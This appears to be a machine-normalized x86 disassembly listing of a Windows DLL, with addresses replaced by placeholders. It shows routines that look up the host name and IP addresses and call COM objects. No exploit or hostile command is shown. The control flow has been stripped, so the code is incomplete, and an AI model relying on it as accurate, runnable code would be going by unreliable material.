mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor ecx ecx
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ esi ]
lea ecx [ ebp - 0x10 ]
cmp edx ecx
ja r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esi ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
ja r-xdata
mov edi ecx
mov ecx [ esi + 0x8 ]
sub edi edx
sar edi 0x2
cmp eax ecx
jne r-xdata
mov eax [ ebp - 0x14 ]
add [ esi + 0x4 ] 0x4
mov edx [ ebp + 0xc ]
inc eax
lea ecx [ eax * 4 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0xc ]
cmp [ eax + ecx ] 0x0
jne r-xdata
mov [ eax ] edi
push r--data
call sub_100126ab
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
ja r-xdata
mov ecx [ eax + ecx ]
mov eax [ ecx ]
push eax
call [ ntohl@IAT ]
mov edi eax
mov eax [ esi + 0x4 ]
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] edi
cmp edx eax
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
mov edx [ esi ]
mov ecx [ edx + edi * 4 ]
mov [ eax ] ecx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
push ecx
call sub_1000a390
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_1000a390
mov ecx eax
cmp ecx eax
jae r-xdata
sub_1000a390
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x3fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x2
cmp eax ecx
jae r-xdata
push r--data
call sub_100126ab
pop ebp
retn 0x4
push ebx
push edi
call sub_100054f0
mov ecx [ esi + 0x4 ]
mov ebx eax
mov eax [ esi ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push ebx
call sub_100128c0
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0xc
sar edi 0x2
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebx + edi * 4 ]
lea eax [ ebx + edx * 4 ]
pop edi
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ecx
pop ebx
push eax
call sub_10012c4b
add esp 0x4
sub_1000a410
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000a4b0
push ebp
mov ebp esp
sub esp 0x30
push ebx
push edi
mov edi eax
mov edx [ edi ]
mov eax 0x8
mov [ ebp - 0x10 ] ax
mov eax [ edx + 0x4 ]
mov ecx edi
call eax
test eax eax
jne r-xdata
push eax
call [ htonl@IAT ]
push eax
call [ inet_ntoa@IAT ]
mov ebx eax
mov ebx r--data
jmp r-xdata
call sub_10006e30
mov edx [ edi ]
mov ecx 0x12
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x8 ]
mov [ ebp - 0x20 ] cx
mov ecx edi
call eax
mov ecx 0x8
mov ebx r--data
mov [ ebp - 0x18 ] ax
mov [ ebp - 0x30 ] cx
call sub_10006e30
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov edi eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] ecx
mov eax esi
call sub_1000b6f0
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x14 ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] ecx
mov eax esi
call sub_1000b6f0
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x2c ]
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x24 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edx
mov eax esi
call sub_1000b6f0
pop edi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000a590
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d610
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x3c ]
mov [ ebp - 0xac ] edi
mov edi [ ebp + 0x40 ]
mov [ ebp - 0xa8 ] edi
mov edi [ ebp + 0x44 ]
mov [ ebp - 0xa4 ] edi
mov edi [ ebp + 0x4c ]
mov [ ebp - 0x8c ] edi
mov edi [ ebp + 0x50 ]
mov [ ebp - 0x88 ] edi
mov edi [ ebp + 0x54 ]
mov [ ebp - 0x84 ] edi
mov edi [ ebp + 0x58 ]
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x70 ] edi
mov edi [ ebp + 0x5c ]
mov esi [ ebp + 0x2c ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x6c ] edi
mov edi [ ebp + 0x60 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x68 ] edi
mov edi [ ebp + 0x64 ]
mov ebx [ ebp + 0x48 ]
mov [ ebp - 0x64 ] edi
mov edi [ ebp + 0x68 ]
mov [ ebp - 0x20 ] edi
mov edi [ ebp + 0x6c ]
mov [ ebp - 0x1c ] edi
mov edi [ ebp + 0x70 ]
mov [ ebp - 0x18 ] edi
mov edi [ ebp + 0x74 ]
mov [ ebp - 0x14 ] edi
mov edi [ ebp + 0x78 ]
mov [ ebp - 0x98 ] edx
mov edx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] edi
mov edi [ ebp + 0x7c ]
mov [ ebp - 0xbc ] edx
mov edx [ ebp + 0x20 ]
mov [ ebp - 0x7c ] esi
mov esi [ ebp + 0x30 ]
mov [ ebp - 0x5c ] edi
mov edi [ ebp + 0x80 ]
mov [ ebp - 0x9c ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0xb8 ] edx
mov edx [ ebp + 0x24 ]
mov [ ebp - 0x78 ] esi
mov esi [ ebp + 0x34 ]
mov [ ebp - 0x58 ] edi
mov edi [ ebp + 0x84 ]
mov [ ebp - 0x94 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xb4 ] edx
mov edx [ ebp + 0x28 ]
mov [ ebp - 0x74 ] esi
mov esi [ ebp + 0x38 ]
mov [ ebp - 0x54 ] edi
cmp ax 0x8
jne r-xdata
xor eax eax
cmp cx 0x12
jne r-xdata
cmp dx ax
jne r-xdata
cmp si cx
jne r-xdata
cmp bx ax
jne r-xdata
cmp [ ebp - 0x70 ] 0xb
jne r-xdata
cmp [ ebp - 0x20 ] ax
jne r-xdata
cmp [ ebp - 0x60 ] 0x13
jne r-xdata
mov ebx [ ebp - 0x18 ]
xor edi edi
cmp ebx edi
je r-xdata
xor ecx ecx
mov eax ebx
lea edx [ eax + 0x2 ]
mov [ ebp - 0x50 ] edi
lea esi [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
mov ecx eax
jmp r-xdata
mov [ ebp - 0x4c ] edi
lea esi [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
mov eax [ ebp - 0x88 ]
cmp eax edi
je r-xdata
push ebx
lea ebx [ ebp - 0x48 ]
call sub_10006ec0
mov esi eax
mov ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x78 ]
push eax
lea ebx [ ebp - 0x2c ]
call sub_10006ec0
add esp 0x8
mov ecx 0x10
mov [ ebp - 0x4 ] 0x1
cmp [ esi + 0x14 ] ecx
jb r-xdata
lea esi [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
sub eax esi
sar eax 0x1
mov [ ebp - 0x4c ] eax
jmp r-xdata
sub eax esi
sar eax 0x1
mov [ ebp - 0x50 ] eax
jmp r-xdata
cmp [ eax + 0x14 ] ecx
jb r-xdata
mov esi [ esi ]
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
sub eax esi
sar eax 0x1
mov edi eax
mov eax [ ebp - 0x98 ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0x78 ]
cmp eax edi
je r-xdata
mov ebx eax
mov ebx [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x58 ]
movsx edx [ ebp - 0x68 ]
mov eax [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x50 ]
push esi
push edx
push eax
call sub_10006da0
mov ecx [ ebp - 0xa8 ]
mov edx [ ebp - 0xb8 ]
add esp 0x4
push eax
mov eax [ ebp - 0x98 ]
push ecx
push edx
push eax
mov ecx edi
call sub_10006da0
add esp 0x4
push eax
mov ecx ebx
call sub_1000a980
add esp 0x1c
lea esi [ ebp - 0x2c ]
mov edi eax
call sub_10002a30
lea esi [ ebp - 0x48 ]
call sub_10002a30
mov eax edi
jmp r-xdata
sub_1000a830
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov edi ecx
mov esi eax
mov eax edi
call sub_1000a4b0
mov edx [ edi ]
mov eax 0x12
mov [ ebp - 0x20 ] ax
mov eax [ edx + 0x10 ]
mov ecx edi
call eax
mov edx [ edi ]
mov ecx 0x8
mov [ ebp - 0x18 ] ax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] cx
mov ecx edi
call eax
test eax eax
jne r-xdata
push eax
call [ htonl@IAT ]
push eax
call [ inet_ntoa@IAT ]
mov ebx eax
mov ebx r--data
jmp r-xdata
call sub_10006e30
mov [ ebp - 0x8 ] eax
mov edx 0x1
mov ecx 0xb
mov [ ebp - 0x28 ] dx
mov edx [ edi ]
mov eax 0x8
mov [ ebp - 0x30 ] cx
mov [ ebp - 0x40 ] ax
mov eax [ edx + 0x1c ]
mov ecx edi
call eax
mov ebx eax
call sub_10006e30
mov edx [ edi ]
mov ecx 0x13
mov ebx eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x50 ] cx
mov ecx edi
call eax
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov edi eax
sub esp 0x10
mov eax esp
mov [ eax ] ecx
mov ecx [ ebp - 0x18 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
mov eax esi
call sub_1000b6f0
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
sub esp 0x10
mov eax esp
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
mov eax esi
call sub_1000b6f0
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x2c ]
sub esp 0x10
mov eax esp
mov [ eax ] ecx
mov ecx [ ebp - 0x28 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0x24 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
mov eax esi
call sub_1000b6f0
mov ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x3c ]
sub esp 0x10
mov eax esp
mov [ eax ] ecx
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ecx
mov eax esi
call sub_1000b6f0
mov edx [ ebp - 0x50 ]
mov ecx [ ebp - 0x4c ]
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edx
mov eax esi
call sub_1000b6f0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000a980
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d170
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x1c ]
push 0x54
mov edi ecx
mov [ ebp - 0x4c ] eax
call sub_10012ca7
xor ecx ecx
add esp 0x4
lea edx [ ecx + 0xf ]
cmp eax ecx
je r-xdata
xor ebx ebx
mov [ eax ] r--data
mov [ eax + 0x20 ] edx
mov [ eax + 0x1c ] ecx
mov [ eax + 0xc ] cl
mov [ eax + 0x48 ] edx
mov [ eax + 0x44 ] ecx
mov [ eax + 0x34 ] cl
mov ebx eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
mov eax edi
lea ecx [ ebp - 0x2c ]
call sub_10004db0
lea esi [ ebx + 0xc ]
lea edi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call sub_10005ef0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4 ] eax
mov ax [ ebp + 0xc ]
mov [ ebx + 0x8 ] ax
mov eax edi
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x2c ] cl
lea edx [ eax + 0x1 ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x18 ]
mov dx [ ebp + 0x10 ]
mov [ ebx + 0x2c ] eax
mov eax [ ebp - 0x4c ]
mov [ ebx + 0x30 ] ecx
mov ecx eax
mov [ ebx + 0x28 ] dx
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
lea esi [ ecx + 0x1 ]
mov edi edi
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10012c4b
add esp 0x4
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
mov esi ecx
lea ecx [ ebp - 0x48 ]
call sub_10004db0
lea esi [ ebx + 0x34 ]
lea edi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10005ef0
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
mov ecx [ ebp + 0x20 ]
mov [ ebx + 0x50 ] ecx
mov edx [ ebp - 0x48 ]
push edx
call sub_10012c4b
mov eax [ ebp + 0x20 ]
add esp 0x4
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
sub_1000aae0
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x48 ] 0x10
jb r-xdata
push ebx
xor ebx ebx
mov [ esi + 0x48 ] 0xf
mov [ esi + 0x44 ] ebx
mov [ esi + 0x34 ] bl
cmp [ esi + 0x20 ] 0x10
jb r-xdata
mov eax [ esi + 0x34 ]
push eax
call sub_10012c4b
add esp 0x4
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] 0xf
mov [ esi + 0xc ] bl
mov [ esi ] r--data
pop ebx
je r-xdata
mov ecx [ esi + 0xc ]
push ecx
call sub_10012c4b
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000ab50
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c3eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x14 ]
push ecx
push r--data
push 0x1
push ebx
push r--data
mov [ ebp - 0x14 ] ebx
call [ CoCreateInstance@IAT ]
mov ecx [ ebp - 0x14 ]
mov edi ecx
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] ebx
cmp eax ebx
jl r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov edx [ ecx ]
push ecx
lea eax [ ebp - 0x10 ]
push eax
push ebx
mov [ ebp - 0x10 ] ebx
mov edx [ ecx ]
push r--data
push ecx
mov ecx [ edx + 0x1c ]
call ecx
mov ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
jl r-xdata
mov [ ebp - 0x4 ] bl
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi ]
push edi
jmp r-xdata
mov eax [ ecx ]
push ecx
mov ecx [ eax + 0x8 ]
call ecx
push 0x14
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
mov eax [ edx + 0x8 ]
call eax
xor eax eax
mov edx [ ebp - 0x10 ]
push edx
push eax
call sub_10009e50
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
mov [ ebp - 0x4 ] bl
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push esi
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ edi ]
mov edx [ ecx + 0x8 ]
push edi
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1000ac80
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c09b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x8
call sub_10012ca7
mov edi eax
add esp 0x4
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] 0x0
test edi edi
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov [ edi ] r--data
mov [ edi + 0x4 ] 0x0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x1
call sub_10012ca7
mov esi eax
add esp 0x4
test esi esi
je r-xdata
xor esi esi
push 0x0
call [ CoInitialize@IAT ]
jmp r-xdata
mov [ rw-data ] esi
sub_1000ad20
push esi
mov esi ecx
push esi
call sub_1000ab50
mov ecx [ esi + 0x4 ]
pop esi
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x8 ]
sub eax [ ecx + 0x4 ]
sar eax 0x2
retn
sub_1000ad40
push ebp
mov ebp esp
push 0xffffffff
push sub_1001bf88
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000adb0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c05e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x80
lea eax [ ebp - 0x90 ]
push 0x0
push eax
call sub_10018220
add esp 0xc
push 0x80
lea ecx [ ebp - 0x90 ]
push ecx
call [ gethostname@IAT ]
test eax eax
jne r-xdata
xor eax eax
lea edx [ ebp - 0x90 ]
push edx
call [ gethostbyname@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x14
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x94 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push esi
push eax
call sub_1000a1f0
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
sub_1000ae60
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c6d3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push edi
call sub_1000ab50
cmp [ edi + 0x4 ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0xc
call sub_10012ca7
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
lea eax [ esi + 0x8 ]
mov [ eax ] r--data
mov [ esi ] r--data
mov [ eax ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1000af10
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000af40
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c028
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi + 0x8 ] r--data
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000afc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d5d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx - 0x4 ]
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x3c ]
call eax
test eax eax
js r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x10 ]
test edx edx
je r-xdata
mov edi edx
mov [ ebp - 0x14 ] edi
mov eax edx
mov [ ebp - 0x4 ] 0x0
lea esi [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
cmp eax 0x7
ja r-xdata
push r--data
push edx
call sub_10012fa9
mov ecx [ ebp - 0x10 ]
add esp 0x8
cmp eax ecx
je r-xdata
push edx
call [ SysFreeString@IAT ]
lea esi [ ecx + 0xe ]
push r--data
push esi
call sub_10012fa9
add esp 0x8
test eax eax
je r-xdata
test edi edi
je r-xdata
sub eax esi
sar eax 0x1
je r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push edi
call [ SysFreeString@IAT ]
push esi
mov ecx eax
call sub_10006da0
add esp 0x4
mov esi eax
test edi edi
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push edi
call [ SysFreeString@IAT ]
sub_1000b0d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c3b1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
lea eax [ edi - 0x8 ]
push eax
call sub_10009ba0
mov esi eax
xor ebx ebx
cmp esi ebx
je r-xdata
mov eax [ edi - 0x4 ]
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ebx
mov edx [ eax ]
mov edx [ edx + 0x2c ]
push ecx
push eax
call edx
cmp eax ebx
jl r-xdata
mov [ ebp - 0x18 ] esi
push 0xc
mov [ ebp - 0x4 ] ebx
call sub_10012ca7
mov edi eax
add esp 0x4
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
xor edi edi
mov [ ebp - 0x4 ] 0x2
mov [ edi ] r--data
mov [ edi + 0x4 ] esi
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
push esi
call edx
mov [ edi + 0x8 ] r--data
mov [ edi ] r--data
mov [ edi + 0x8 ] r--data
add edi 0x8
jmp r-xdata
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x14
mov [ ebp - 0x4 ] 0x3
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x4
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edi edi
mov ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10009e50
mov edi eax
jmp r-xdata
test edi edi
je r-xdata
mov edi edi
mov [ ebp - 0x4 ] 0x3
mov edx [ edi + 0x8 ]
sub edx [ edi + 0x4 ]
sar edx 0x2
test edx edx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
xor esi esi
mov eax [ edi + 0x4 ]
mov eax [ eax + ebx * 4 ]
mov [ ebp - 0x4 ] 0x6
mov [ esi ] r--data
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
mov [ esi + 0x8 ] r--data
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
test edi edi
je r-xdata
mov eax [ edi + 0x8 ]
sub eax [ edi + 0x4 ]
inc ebx
sar eax 0x2
cmp ebx eax
jb r-xdata
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x8 ]
mov edx [ eax + 0x8 ]
lea ecx [ esi + 0x8 ]
call edx
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
mov esi [ ebp - 0x18 ]
test esi esi
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ edx ]
